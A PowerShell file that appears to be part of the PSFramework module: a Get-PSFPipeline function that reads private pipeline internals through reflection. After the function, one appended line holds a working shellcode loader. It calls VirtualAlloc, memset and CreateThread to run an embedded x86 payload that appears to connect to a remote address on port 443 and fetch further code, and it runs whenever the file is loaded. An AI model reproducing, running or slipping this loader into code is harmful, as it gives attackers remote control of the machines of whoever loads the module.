function Get-PSFPipeline
{

	[OutputType([PSFramework.Meta.Pipeline])]
	[CmdletBinding()]
	param (
		
	)
	
	begin
	{
		function Get-PrivateProperty
		{
			[CmdletBinding()]
			param (
				$Object,
				
				[string]
				$Name,
				
				[ValidateSet('Any', 'Field', 'Property')]
				[string]
				$Type = 'Any'
			)
			
			if ($null -eq $Object) { return }
			
			$typeObject = $Object.GetType()
			[System.Reflection.BindingFlags]$flags = "NonPublic, Instance"
			switch ($Type)
			{
				'Field'
				{
					$field = $typeObject.GetField($Name, $flags)
					$field.GetValue($Object)
				}
				'Property'
				{
					$property = $typeObject.GetProperty($Name, $flags)
					$property.GetValue($Object)
				}
				'Any'
				{
					$field = $typeObject.GetField($Name, $flags)
					if ($field) { return $field.GetValue($Object) }
					$property = $typeObject.GetProperty($Name, $flags)
					$property.GetValue($Object)
				}
			}
		}
	}
	process
	{
		$callerCmdlet = (Get-PSCallStack)[1].GetFrameVariables()["PSCmdlet"].Value
		
		$commandRuntime = Get-PrivateProperty -Object $callerCmdlet -Name _commandRuntime -Type Field
		$pipelineProcessor = Get-PrivateProperty -Object $commandRuntime -Name PipelineProcessor -Type Property
		$localPipeline = Get-PrivateProperty -Object $pipelineProcessor -Name LocalPipeline -Type Property
		
		$pipeline = New-Object PSFramework.Meta.Pipeline -Property @{
			InstanceId = $localPipeline.InstanceId
			StartTime  = Get-PrivateProperty -Object $localPipeline -Name _pipelineStartTime -Type Field
			Text	   = Get-PrivateProperty -Object $localPipeline -Name HistoryString -Type Property
			PipelineItem = $localPipeline
		}
		
		if ($pipeline.Text)
		{
			$tokens = $null
			$errorItems = $null
			$ast = [System.Management.Automation.Language.Parser]::ParseInput($pipeline.Text, [ref]$tokens, [ref]$errorItems)
			$pipeline.Ast = $ast
			
			$baseItem = $ast.EndBlock.Statements[0]
			if ($baseItem -is [System.Management.Automation.Language.AssignmentStatementAst])
			{
				$pipeline.OutputAssigned = $true
				$pipeline.OutputAssignedTo = $baseItem.Left
				$baseItem = $baseItem.Right.PipelineElements
			}
			else { $baseItem = $baseItem.PipelineElements }
			
			if ($baseItem[0] -is [System.Management.Automation.Language.CommandExpressionAst])
			{
				if ($baseItem[0].Expression -is [System.Management.Automation.Language.VariableExpressionAst])
				{
					$pipeline.InputFromVariable = $true
					$pipeline.InputVariable = $baseItem[0].Expression.VariablePath.UserPath
				}
				else { $pipeline.InputDirect = $true }
				if ($baseItem[0].Expression -is [System.Management.Automation.Language.ConstantExpressionAst])
				{
					$pipeline.InputValue = $baseItem[0].Expression.Value
				}
				elseif ($baseItem[0].Expression -is [System.Management.Automation.Language.ArrayLiteralAst])
				{
					$pipeline.InputValue = @()
					foreach ($element in $baseItem[0].Expression.Elements)
					{
						if ($element -is [System.Management.Automation.Language.ConstantExpressionAst])
						{
							$pipeline.InputValue += $element.Value
						}
						else { $pipeline.InputValue += $element }
					}
				}
				else { $pipeline.InputValue = $baseItem[0].Expression }
			}
		}
		
		$commands = Get-PrivateProperty -Object $pipelineProcessor -Name Commands -Type Property
		$index = 0
		foreach ($command in $commands)
		{
			$commandItem = Get-PrivateProperty -Object $command -Name Command
			$pipeline.Commands.Add((New-Object PSFramework.Meta.PipelineCommand($pipeline.InstanceId, $index, (Get-PrivateProperty -Object $command -Name CommandInfo), $commandItem.MyInvocation, $commandItem)))
			$index++
		}
		
		$pipeline
	}
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x0a,0xa1,0x64,0x0a,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

